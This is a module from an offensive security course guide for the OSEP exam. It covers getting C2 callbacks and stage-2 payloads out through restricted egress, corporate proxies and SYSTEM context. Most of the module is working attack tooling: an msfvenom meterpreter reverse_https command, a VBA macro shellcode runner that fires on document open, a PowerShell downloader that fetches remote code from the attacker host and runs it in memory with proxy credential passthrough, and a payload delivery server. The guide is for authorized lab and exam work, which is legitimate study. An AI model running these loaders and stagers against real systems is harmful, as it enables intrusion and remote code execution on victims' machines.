::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 09 · C2 callbacks and egress channels (staged / proxy / DNS / domain fronting)

> **Covers scenarios:** 17, 28, 29, 30, 31, 32, 33
>
> **Prerequisites:** attacker box (Kali) + one entry session; HTTPS needs a self-signed certificate (generation in [00-environment-and-infra](/modules/00-environment-and-infra) §3); a DNS channel needs a domain whose NS records point at you, or lab-allowed direct UDP 53 to the attacker; domain fronting needs a CDN or a self-built nginx front-end that can forward by custom Host header.

**Core idea**: this module solves "code runs, but the session / stage 2 never comes back". Every approach hangs off one **proven reachable path**: verify the path first (delivery, proxy, DNS resolution, TLS handshake), then run every stage over that same path. Changing address, port, protocol or proxy context at any stage is just scenario 30 again.

---

## Scenario 17: Target has no stable egress, so the download-style stage 2 never arrives

**Situation**: the entry point executes code, but the target cannot reach your file server and only a few addresses are allowed out; every macro, script and loader that depends on an ad-hoc download fails.

**Assumptions**: you have an entry point that executes code (VBA / HTA / JScript, see M01–M03); stage 2 sits on an internet-facing file server; DNS resolution on the target or any egress to that server fails; shellcode and runner are ready.

**Prepare (attacker side)**: build **both variants side by side** for every entry point: the embedded variant (shellcode + runner in a single file / single process, zero external downloads) and the download variant (stager pulls stage 2 from the attacker box). Do not keep only one — switching shape mid-exam and rebuilding costs a lot of time.

```bash
# Embedded version prep: generate shellcode (confirm target bitness first, store x86/x64 separately)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f ps1 > ~/osep/payloads/win/x64/run.ps1
# Paste the shellcode blob into the runner (the M01/M03 embedded runners reserve an INSERT SHELLCODE HERE comment slot)
# Download version prep: host stage 2 on the delivery server
cp ~/osep/payloads/win/x64/run.ps1 ~/osep/payloads/PAYLOAD
python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads   # request log confirms "did it actually download"
```

**Procedure**:
1. Confirm the entry point executes with a harmless callback first (callback ping / nslookup / file write, see M01). Do **not** jump straight to the download variant: if even the callback cannot get out, the download is guaranteed to fail.
2. Map the target's egress: from the target run `Test-NetConnection LHOST -Port 80/443` and `nslookup URL`, and record which path works.
3. Egress works → use the download-variant stager (the download-and-execute shapes in `docs/01` scenario 3 and `docs/03` scenario 9); egress blocked → switch to the embedded variant and deliver stage 2 embedded in a single runner file.
4. Embedded variant is still too big or gets killed (scenarios 18–19) → use M03's "bridge + C# stage 2" to move the heavy logic into in-memory JScript/C#, so nothing lands on disk and nothing is downloaded.
5. After delivery, watch the m00 server log (is there a GET?) and the listener (did a session establish?).

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m00-delivery-server.py` | Delivery and request log for the download variant | `--port 80 --dir ~/osep/payloads` |
| `m01-shellcode-runner-vba-archbranch.vba` | Embedded-variant reference (check bitness, then pick shellcode) | paste the shellcode block |
| `m03-dotnettojscript-loader.js` | Bridge reference for an embedded stage 2 | paste the C# payload |
| `m09-proxy-aware-downloader.ps1` | Downloader for when downloads must go through the system proxy | see scenario 28 |

#### `m00-delivery-server.py` {#m00-delivery-server-py}

````python
#!/usr/bin/env python3
"""Purpose: delivery server - HTTP/HTTPS dual channel, records the source, User-Agent and path of every request, to confirm "the target really downloaded it"

Scenario: shared infrastructure (pairs with docs/00-environment-and-infra.md; supports delivery and troubleshooting for scenarios 3, 8, 15, 16, 17, 28, 30, 31)

Dependencies: Python 3.7+ (standard library); HTTPS needs cert/key (generate with openssl or m00-build-payloads.sh)

Usage:
    # HTTP (default 80)
    python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads

    # HTTPS (self-signed)
    python3 m00-delivery-server.py --port 443 --dir ~/osep/payloads \
        --cert ~/osep/tools/cert.pem --key ~/osep/tools/key.pem

    # probe mode only: do not return files, only record requests (confirms the target egress path)
    python3 m00-delivery-server.py --port 8000 --probe-only

Placeholders: LHOST=attacker machine IP (the script prints the usable URLs); PAYLOAD=payload filename placed under --dir

Test status: syntax-checked with Python 3 on a local macOS host (py_compile); HTTP mode can be run directly to verify
"""
from __future__ import annotations

import argparse
import datetime
import http.server
import os
import socket
import ssl
import sys
import threading

class LoggedHandler(http.server.SimpleHTTPRequestHandler):
    """static file server with structured logging; probe-only mode only records requests, it does not return files."""

    probe_only = False
    log_path = "delivery.log"
    server_version = "DeliveryServer/1.0"
    _lock = threading.Lock()

    def _client(self) -> str:
        return f"{self.client_address[0]}:{self.client_address[1]}"

    def _record(self, method: str, status: int, note: str = "") -> None:
        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ua = self.headers.get("User-Agent", "-")
        host = self.headers.get("Host", "-")
        line = f"{stamp}\t{self._client()}\t{method}\t{self.path}\t{status}\t{host}\t{ua}\t{note}"
        with self._lock:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        print(line, flush=True)

    def do_GET(self):  # noqa: N802
        if self.probe_only:
            self._record("GET", 200, "probe-only")
            body = b"ok\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self._record("GET", 200)
        super().do_GET()

    def do_POST(self):  # noqa: N802
        length = int(self.headers.get("Content-Length", 0) or 0)
        data = self.rfile.read(length) if length else b""
        self._record("POST", 200, f"body={data[:200]!r}")
        body = b"ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_HEAD(self):  # noqa: N802
        self._record("HEAD", 200)
        super().do_HEAD()

    def log_message(self, fmt, *args):  # suppress the default stderr output, route everything through _record
        return

def local_ips() -> list[str]:
    ips = set()
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            ips.add(info[4][0])
    except Exception:
        pass
    # Fallback: probe the default route egress address
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    return sorted(ip for ip in ips if not ip.startswith("127."))

def main() -> int:
    ap = argparse.ArgumentParser(description="OSEP delivery server (HTTP/HTTPS + request log)")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--dir", default=os.path.expanduser("~/osep/payloads"))
    ap.add_argument("--cert", default="")
    ap.add_argument("--key", default="")
    ap.add_argument("--log", default="", help="log path, defaults to <dir>/../logs/delivery.log")
    ap.add_argument("--probe-only", action="store_true", help="only record requests, do not return files")
    args = ap.parse_args()

    root = os.path.abspath(os.path.expanduser(args.dir))
    if not os.path.isdir(root):
        os.makedirs(root, exist_ok=True)
    log_path = args.log or os.path.join(os.path.dirname(root), "logs", "delivery.log")
    os.makedirs(os.path.dirname(log_path), exist_ok=True)

    LoggedHandler.probe_only = args.probe_only
    LoggedHandler.log_path = log_path

    handler = lambda *a, **kw: LoggedHandler(*a, directory=root, **kw)  # noqa: E731
    httpd = http.server.ThreadingHTTPServer((args.bind, args.port), handler)

    scheme = "http"
    if args.cert and args.key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=os.path.expanduser(args.cert), keyfile=os.path.expanduser(args.key))
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        scheme = "https"

    print(f"[*] Delivery root: {root}")
    print(f"[*] Request log:   {log_path}")
    print(f"[*] Mode:       {'probe-only (log only)' if args.probe_only else 'file delivery'}")
    print("[*] Available addresses:")
    for ip in local_ips():
        print(f"      {scheme}://{ip}:{args.port}/PAYLOAD")
    print("[*] Ctrl+C to stop")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped")
    finally:
        httpd.server_close()
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

#### `m01-shellcode-runner-vba-archbranch.vba` {#m01-shellcode-runner-vba-archbranch-vba}

````vb
' Purpose: use VBA compile-time constants to auto-match Office bitness, so a Runner with mismatched bitness does not crash the host
' Scenario: 1 (the "one-shot" version when bitness is unknown)
' Dependencies: Office; two shellcode sets, x64 and x86 (each XOR encoded)
' Usage: paste the two shellcode blobs into GetX64Shellcode / GetX86Shellcode, drop into ThisDocument, and save as .docm
' Placeholders: SHELLCODE_X64, SHELLCODE_X86 (byte arrays), XOR_KEY
' Test status: not tested on Windows; the #If Win64 compile-time branch syntax was checked manually
'
' Note: VBA #If Win64 is a **compile-time** constant, so Office knows at macro load time whether it is 32- or 64-bit,
'       so the same .docm takes the right branch on both Office builds - more reliable than runtime WMI probing.
Option Explicit

Private Const XOR_KEY As Byte = &H2A

#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, _
        ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
        ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
    Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
#Else
    Private Declare Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As Long, ByVal dwSize As Long, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
        ByVal lpStartAddress As Long, ByVal lpParameter As Long, _
        ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
    Private Declare Sub RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long)
    Private Declare Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
#End If

Sub RunShellcode()
    Dim sc() As Byte, i As Long

    #If Win64 Then
        sc = GetX64Shellcode()      ' 64-bit Office -> x64 shellcode
    #Else
        sc = GetX86Shellcode()      ' 32-bit Office -> x86 shellcode
    #End If

    For i = LBound(sc) To UBound(sc)
        sc(i) = sc(i) Xor XOR_KEY
    Next i

    Dim mem As LongPtr, hThread As LongPtr
    mem = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40)
    If mem = 0 Then Exit Sub
    RtlMoveMemory mem, sc(0), UBound(sc) + 1

    hThread = CreateThread(0, 0, mem, 0, 0, 0)
    If hThread = 0 Then Exit Sub
    WaitForSingleObject hThread, 1000
End Sub

Private Function GetX64Shellcode() As Byte()
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetX64Shellcode = tmp
End Function

Private Function GetX86Shellcode() As Byte()
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetX86Shellcode = tmp
End Function

Sub AutoOpen()
    RunShellcode
End Sub

Sub Document_Open()
    RunShellcode
End Sub
````

#### `m03-dotnettojscript-loader.js` {#m03-dotnettojscript-loader-js}

````javascript
/*
 * Purpose: skeleton/paste container for DotNetToJScript bridge output + host preflight.
 *      DotNetToJScript.exe serializes a C# assembly into a complete runner.js (hundreds of lines of base64),
 *      this file is used to: (a) record the standard generation command; (b) run a host bitness/.NET preflight before delivery;
 *      (c) when manual assembly is needed, paste the entire tool output into the "paste area" below.
 * Scenario: 9, 10 (cheat sheet JScript > Meterpreter Loader with DotNetToJScript)
 * Dependencies: Windows tooling host + DotNetToJScript.exe; target WSH + .NET (v4 or v2).
 * Usage:
 *  1) generate the complete artifact (it runs standalone, this file is not needed):
 *       DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
 *  2) local preflight (put the artifact in the same directory as this file and run this file to see host info):
 *       cscript //nologo m03-dotnettojscript-loader.js
 *  3) for manual pasting: paste the entire tool output between PASTE_BEGIN/PASTE_END below,
 *     save, then run it with cscript.
 * Placeholders: none (host info is read automatically); the paste area holds tool output, do not hand-edit the base64.
 * Test status: host preflight logic passed a JS syntax check (node --check);
 *     artifact generation/activation must be verified in a Windows lab environment.
 */

// ===================== host preflight (read-only, no artifact changes) =====================
var fso = new ActiveXObject("Scripting.FileSystemObject");
var env = new ActiveXObject("WScript.Shell").Environment("Process");

WScript.Echo("[*] Host          : " + WScript.FullName);
WScript.Echo("[*] OS arch       : " + env("PROCESSOR_ARCHITECTURE"));
// Host bitness decides which assembly platform can load: 64-bit host -> x64/AnyCPU; 32-bit host -> x86/AnyCPU
if (env("PROCESSOR_ARCHITECTURE") === "x86" &&
    env("PROCESSOR_ARCHITEW6432") === "AMD64") {
    WScript.Echo("[!] this process is 32-bit (running on x64 OS) - payload must be x86 or AnyCPU");
}

// .NET version directory probe: v4 exists by default; v2/v3.5 needs the feature enabled
var windir = env("WINDIR");
var net4 = windir + "\\Microsoft.NET\\Framework64\\v4.0.30319";
var net2 = windir + "\\Microsoft.NET\\Framework64\\v2.0.50727";
WScript.Echo("[*] .NET v4 dir   : " + (fso.FolderExists(net4) ? "present" : "missing"));
WScript.Echo("[*] .NET v2 dir   : " + (fso.FolderExists(net2) ? "present" : "missing"));
if (!fso.FolderExists(net4) && !fso.FolderExists(net2)) {
    WScript.Echo("[!] no .NET Framework directory found, DotNetToJScript v4/v2 output cannot run");
    WScript.Quit(1);
}

// ===================== paste area =====================
// Paste the complete JS content generated by DotNetToJScript here (including its own leading
// var serialized_obj = "..." and the deserialization/activation code that follows), and delete the two placeholder lines below.
// mind the match between the artifact and the host bitness/.NET version (v2 artifacts need .NET 2.0/3.5).
// PASTE_BEGIN
WScript.Echo("[*] paste area is empty: run DotNetToJScript first to generate the artifact,");
WScript.Echo("[*] or deliver the runner.js artifact as an attachment (recommended, do not hand-edit).");
WScript.Echo("[*] the host info above confirms whether the artifact platform (--ver/build platform) matches.");
// PASTE_END

WScript.Quit(0);
````

#### `m09-proxy-aware-downloader.ps1` {#m09-proxy-aware-downloader-ps1}

````powershell
<#
# Purpose: proxy-aware downloader/executor. Reads the system proxy (WinINet user context) or uses an explicit proxy to download a URL,
#       supports proxy auth (current-token passthrough NTLM or plaintext credentials). Can write a file to disk only, run in memory, or IEX the content directly.
#       Covers scenarios: 28 (system proxy + proxy auth), 29 (proxy differences between user context and SYSTEM),
#       30 (proxy path for download-style stage 2), 31 (HTTPS + certificate validation toggle).
# Dependencies: PowerShell 5.1+ (Windows); no extra modules. The target must reach the attacker machine URL through the proxy.
# Usage:
#   1) Download to a file through the automatic system proxy:
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/PAYLOAD -OutFile C:\Windows\Temp\PAYLOAD
#   2) Download through the automatic system proxy and run in memory (stager usage, IEX):
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/stage2.ps1 -Command
#   3) Explicit proxy + plaintext auth:
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url https://LHOST/PAYLOAD -OutFile x.bin `
#          -ProxyUrl http://proxy.corp:8080 -ProxyUser DOMAIN\USER -ProxyPass PASS
#   4) Explicit proxy + current-token auth (NTLM passthrough, common in domain user scenarios):
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/stage2.ps1 -Command `
#          -ProxyUrl http://proxy.corp:8080 -DefaultCreds
#   5) Connectivity test only (download 8 bytes and report the proxy chosen), does not change system settings:
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/probe.txt -TestOnly
# Placeholders: LHOST=attacker machine IP, LPORT=port, PAYLOAD=delivered filename, DOMAIN\USER / PASS=proxy credentials, URL=https?://LHOST[:LPORT]/PAYLOAD
# Test status: no Windows testing done on this host (no Windows environment), syntax-level checks only; logic written against the scenario 28/29 lab results,
#           must be verified separately in the lab network user context and the SYSTEM context. SYSTEM context note: netsh winhttp and HKCU do not share settings.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Url,
    [string]$OutFile = "",
    [switch]$Command,          # IEX the downloaded content directly (runs in memory, never touches disk)
    [switch]$TestOnly,         # probe connectivity only: download a small file and report the proxy used, do not execute content
    [string]$ProxyUrl = "",    # explicit proxy http://host:port (takes priority over the system proxy)
    [string]$ProxyUser = "",   # proxy auth user (DOMAIN\user or user)
    [string]$ProxyPass = "",
    [switch]$DefaultCreds,     # authenticate to the proxy with the current process token (NTLM passthrough)
    [switch]$SkipCertCheck,    # skip TLS certificate validation (use with self-signed certificates; only passes when the target has no MITM inspection)
    [int]$TimeoutSec = 20
)

$ErrorActionPreference = "Stop"

# ---- TLS 1.2 + optional certificate validation skip ----
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
if ($SkipCertCheck) {
    Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert,
        WebRequest req, int problem) { return true; }
}
"@
    [Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
}

function Get-EffectiveProxy([string]$targetUrl) {
    # Priority: explicit ProxyUrl > system proxy (WinINet/HKCU) > direct
    if ($ProxyUrl) {
        $p = New-Object Net.WebProxy($ProxyUrl)
        $p.BypassProxyOnLocal = $false
        return $p
    }
    try {
        $sys = [Net.WebRequest]::GetSystemWebProxy()
        $sys.Credentials = [Net.CredentialCache]::DefaultCredentials
        $u = $sys.GetProxy([uri]$targetUrl)
        if ($u -and $u.AbsoluteUri -ne $targetUrl) { return $sys }
    } catch { Write-Warning "[!] failed to read the system proxy (probably no HKCU proxy settings): $($_.Exception.Message)" }
    Write-Host "[*] no system proxy found, going direct to $targetUrl" -ForegroundColor Cyan
    return $null
}

Write-Host "[*] Target URL : $Url"
Write-Host "[*] Current identity : $([Environment]::UserDomainName)\$([Environment]::UserName)  (mind proxy differences in SYSTEM context)" -ForegroundColor Cyan

$wc = New-Object Net.WebClient
$proxy = Get-EffectiveProxy $Url
if ($null -ne $proxy) {
    if ($DefaultCreds) { $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials }
    elseif ($ProxyUser) {
        if ($ProxyUser -match '\\') {
            $d, $u = $ProxyUser.Split('\')
            $proxy.Credentials = New-Object Net.NetworkCredential($u, $ProxyPass, $d)
        } else {
            $proxy.Credentials = New-Object Net.NetworkCredential($ProxyUser, $ProxyPass)
        }
    }
    $wc.Proxy = $proxy
    Write-Host "[*] Using proxy : $($proxy.Address)" -ForegroundColor Cyan
} else {
    $wc.Proxy = $null   # direct connection
}
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

try {
    if ($TestOnly) {
        # Probe mode: request a HEAD/small GET, the only question is whether it reaches the attacker machine (cross-check the m00-delivery-server log)
        $resp = $wc.DownloadData($Url)
        Write-Host "[+] connectivity OK: received $($resp.Length) bytes (from $Url)" -ForegroundColor Green
        exit 0
    }
    if ($Command) {
        Write-Host "[*] Download and run in memory : $Url"
        $code = $wc.DownloadString($Url)
        Write-Host "[+] got $($code.Length) characters of content, starting IEX ..." -ForegroundColor Green
        Invoke-Expression $code
    } elseif ($OutFile) {
        Write-Host "[*] Download to file : $OutFile"
        $dir = Split-Path -Parent $OutFile
        if ($dir -and -not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        $wc.DownloadFile($Url, $OutFile)
        if ((Get-Item $OutFile).Length -gt 0) {
            Write-Host "[+] saved $(Get-Item $OutFile).Length bytes -> $OutFile" -ForegroundColor Green
        } else {
            Write-Error "[-] the file is empty, the download was probably blocked by the proxy/server"
        }
    } else {
        Write-Error "[-] specify one of -OutFile, -Command or -TestOnly"
    }
} catch [Net.WebException] {
    $code = $_.Exception.Response.StatusCode.value__
    if ($code -eq 407) {
        Write-Host "[-] proxy authentication failed (407): try -DefaultCreds (NTLM passthrough) or -ProxyUser DOMAIN\USER -ProxyPass PASS" -ForegroundColor Red
    } elseif ($code -eq 403) {
        Write-Host "[-] rejected by the proxy/server (403): change UA/path, or check whether that URL is allowlisted (scenarios 31/33)" -ForegroundColor Red
    } else {
        Write-Host "[-] request failed HTTP $code : $Url (when direct fails, check the system proxy, scenario 28)" -ForegroundColor Red
    }
    Write-Host "[-] Detail : $($_.Exception.Message)" -ForegroundColor Red
    if ($_.Exception.InnerException) { Write-Host "[-] Inner : $($_.Exception.InnerException.Message)" }
    exit 1
} catch {
    Write-Host "[-] Unexpected error : $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}
````

**Validation**: a GET from the target IP in the m00 log means the download path works; a session on the listener means the whole chain works. With no log entry and no session, check the three basic callbacks (ping / nslookup / file write) to tell "the entry point never ran" apart from "egress is blocked".

**Failure branches and alternatives**:
- No egress at all (not even DNS) → drop callback-based options and go offline-drop: write to disk plus a scheduled task or service for persistence, and have the results written to a file that another entry point retrieves (M01 scenario 5).
- Only a few domains or ports are allowed → use the proxy (scenario 28), domain fronting (scenario 33), or HTTPS on 443 (scenario 31).
- Embedded variant runs but exits instantly → bitness mismatch or shellcode generated for the wrong architecture; use the archbranch version (M01).

**Exam / OPSEC notes**: keep the embedded and download variants in **separate directories** with clear comments, so you do not deliver the wrong file and burn 10 minutes. Embedded shellcode carries static signatures by default — encode or encrypt it per M05 when needed. "Code execution does not imply egress": verify the path before you run the payload.

---

## Scenario 28: A normal user browses the web fine, but your payload cannot call back directly

**Situation**: the target only reaches the internet through the corporate proxy. The browser works; raw TCP, or an HTTP client that ignores the proxy, fails.

**Assumptions**: you have a normal user session that can run PowerShell; the target has a system or per-user proxy configured (HKCU Internet Settings, or a browser-internal proxy); the proxy may require NTLM authentication (a domain user context usually passes the token through).

**Prepare (attacker side)**: start the delivery server and the HTTPS listener (m00 or m09-https-listener.sh). Read the proxy configuration from the target first and confirm that going through the proxy is enough to reach your address.

```powershell
# Target side: read the user proxy settings (WinINet)
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable
```

**Procedure**:
1. Run a connectivity test with `m09-proxy-aware-downloader.ps1`: the default mode picks up the system proxy automatically and downloads a harmless file (you should see the GET in the m00 log).
2. HTTP 407 (proxy authentication failed) → add `-ProxyUser DOMAIN\USER -ProxyPass PASS` (or `-DefaultCreds` to pass the current token through as NTLM).
3. Once downloads work, use the same path for the callback: the port and address of the HTTPS reverse handler must be reachable through it (443 is the safest); add the same proxy parameters to a PowerShell stager that downloads and executes.
4. Record "user context + proxy → works" as the baseline you will compare against in scenario 29.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m09-proxy-aware-downloader.ps1` | Downloads through the system or an explicit proxy, with authentication | `-Url http://LHOST/PAYLOAD -OutFile` or `-Command` |
| `m00-delivery-server.py` | Delivery plus confirmation that the target really issued the request | `--port 80 --dir ~/osep/payloads` |

**Validation**: a GET from the proxy/target appears in the m00 log; a script downloaded in `-Command` mode produces callback output when it runs; the test file content matches the source.

**Failure branches and alternatives**:
- The browser uses its own proxy (Firefox configured separately) while the system proxy is empty → read the proxy address out of the browser settings and switch to an explicit `-ProxyUrl http://proxy:port`.
- The proxy demands authentication and the current token is rejected → use known credentials with `-ProxyUser/-ProxyPass`. On a plaintext HTTP proxy those credentials are exposed to the proxy, so keep traffic on HTTPS where possible.
- The proxy only allows whitelisted domains → domain fronting (scenario 33) or DNS (scenario 32).

**Exam / OPSEC notes**: the proxy log shows destination URLs → use unremarkable filenames during the download stage and HTTPS for the callback. Keep the UA consistent inside one session (the m09 script sends a browser UA by default). Do not leave domain credentials in plaintext in the command-line history; use `-DefaultCreds` instead when you can.

---

## Scenario 29: The user-context session calls back, but SYSTEM loses the channel

**Situation**: same host, same address — comms work before elevation and fail as SYSTEM, because the two identities use different proxy settings and authentication contexts.

**Assumptions**: you have elevated from a user session to SYSTEM (service, scheduled task, token duplication and similar entry points); corporate egress must go through the proxy; the user-context proxy lives in HKCU (WinINet) while SYSTEM uses WinHTTP by default (`netsh winhttp`). The two **do not share settings**, and SYSTEM has none of the user's credential context.

**Prepare (attacker side)**: start your listener, then compare the output of the two proxy chains on the target first:

```cmd
rem target side (user shell)
netsh winhttp show proxy          rem SYSTEM/machine-level WinHTTP proxy settings
reg query "HKCU\...\Internet Settings" /v ProxyServer   rem user WinINet settings

rem SYSTEM context (service entry point or after PsExec -s)
whoami                            rem confirm nt authority\system
netsh winhttp show proxy
```

**Procedure**:
1. Before elevation, record the evidence that "user + proxy" works (the output from scenario 28).
2. After elevation, do the minimal check first: can SYSTEM open raw TCP and download? If not, check whether the WinHTTP proxy is empty or differs from the user's.
3. Option A (change the machine proxy; needs administrator rights, which SYSTEM already has): `netsh winhttp set proxy proxy-server="http://proxy:8080" bypass-list="<local>"`. Save the original values from `netsh winhttp show proxy` first so you can roll back, and run `netsh winhttp reset proxy` when you are done.
4. Option B (leave the machine alone): in the SYSTEM session use a downloader or client that accepts explicit proxy parameters (`m09-proxy-aware-downloader.ps1 -ProxyUrl ... -ProxyUser ...`) so each component carries its own proxy settings.
5. Option C (authentication-context problem): if the proxy rejects SYSTEM's anonymous/NTLM authentication, run the payloads that need egress back in the user context (for example a scheduled task running as that user), or switch to a channel that needs no proxy authentication (DNS, scenario 32).
6. Only let the handler move to stage 2 once the callback path works, and record the proxy parameters throughout.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m09-proxy-aware-downloader.ps1` | Downloader for both contexts; use an explicit proxy under SYSTEM | `-ProxyUrl http://proxy:8080 -DefaultCreds` |
| `m00-delivery-server.py` | Confirm that SYSTEM really reaches the delivery address | `--port 80` |

**Validation**: a GET appears in the m00 log under the SYSTEM context, or the callback succeeds after `netsh winhttp show proxy` shows the proxy is set; you can explain the output difference between the before/after control runs.

**Failure branches and alternatives**:
- You are not allowed to change the machine proxy (it would break egress for system services) → use an M08 tunnel: forward at a location the target can reach and push the traffic through the user context or a pivot.
- The proxy has no usable credentials for SYSTEM → spawn a process out of the user context that carries those credentials for the egress part, or switch to the DNS channel.
- The privilege-escalation entry point is itself non-interactive (a service restart, for example) → bake the proxy parameters into the payload command line before you trigger it.

**Exam / OPSEC notes**: `netsh winhttp set proxy` affects the **whole machine**; on an exam network it can break other services or even be judged as destructive. Always save the original values and reset when you are done. Keep SYSTEM callbacks on ordinary ports such as 443/80. Test and record the "user vs SYSTEM" paths once each; do not keep retrying user-context parameters under SYSTEM and waste time.

---

## Scenario 30: Stage 1 calls back, but stage 2 never appears

**Situation**: the entry point reaches your listener, but a later stage uses a different address, port or protocol — a path the target does not allow, or one you never configured.

**Assumptions**: stage 1 (stager/callback) works; the listener and delivery infrastructure on the attacker box follow the fixed port plan in `docs/00` (80 delivery, 443 callback, 4444 fallback).

**Prepare (attacker side)**: keep a "path card" per session with fixed fields: entry point → download address/protocol/port → listener address/protocol/port → proxy context → UA. Whenever a stage changes path, update the card before you run it.

**Procedure**:
1. Locate the break: if stage 2 is download-and-execute, check the m00/nginx log for a stage-2 GET from the target. None → the target never reached the download address; present but no session → execution or bitness problem (go to M05).
2. Rule out the usual root causes one by one:
   - Address mismatch: the LHOST written into the stager is an internal address or localhost while the listener sits on another interface — standardize on one interface IP.
   - Port mismatch: the payload was generated with LPORT=4444 but the listener is on 443.
   - Protocol mismatch: stage 1 works over HTTP while stage 2's reverse_https is blocked at the egress → run every stage over the protocol you already proved (443/HTTPS, or the proxy path).
   - Proxy context: stage 1 downloads fine in the user context while stage 2 is triggered by SYSTEM (see scenario 29).
   - The delivery server is not running, the directory name is wrong, or the `PAYLOAD` filename differs in case or path.
3. The most robust move: replace staged (connect, then fetch) with **stageless** (one connection carries everything), so stage 2 does not inherently depend on a second path. If you must stay staged, run both stages through the same delivery server and the same URL template.
4. Set `set ExitOnSession false` on the listener, so the first session dropping does not shut down the whole handler.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m09-https-listener.sh` | Single entry point for HTTPS/HTTP handlers | `--mode msf --payload windows/x64/meterpreter/reverse_https` |
| `m00-delivery-server.py` | Stage-2 delivery plus request log | `--port 80 --dir ~/osep/payloads` |
| `m09-proxy-aware-downloader.ps1` | Stage-2 download when it has to go through a proxy | `-Url http://LHOST/PAYLOAD -Command` |

#### `m09-https-listener.sh` {#m09-https-listener-sh}

````bash
#!/usr/bin/env bash
# Purpose: single entry point on the attacker machine for HTTPS listener / TLS termination forwarding / HTTPS delivery
#       - openssl generates the self-signed certificate; socat / stunnel / sslh / python3 start the TLS listener and forward to the local handler
# Scenarios: 31 (target only allows HTTPS and the TLS handshake or request is inspected), 30 (all staged traffic over 443),
#       33 (backend HTTPS listener/delivery for domain fronting), 15/17 (when the second stage needs HTTPS delivery)
# Dependencies: openssl (required, certificate generation and probing);
#       forwarding tool auto-selected by priority: socat > stunnel4 > python3 (built-in ssl forwarding, zero install);
#       --tool sslh is passthrough mode (does not decrypt TLS, passes traffic as-is to the local msf reverse_https handler);
#       --mode msf needs msfconsole; --mode serve needs python3
# Usage:
#   bash m09-https-listener.sh --mode cert --domain DOMAIN                # generate the self-signed certificate only and print its fingerprint
#   bash m09-https-listener.sh --mode ssl-test --port 8443 --to 4444      # TLS 8443 -> plaintext forwarded to the local 4444 handler
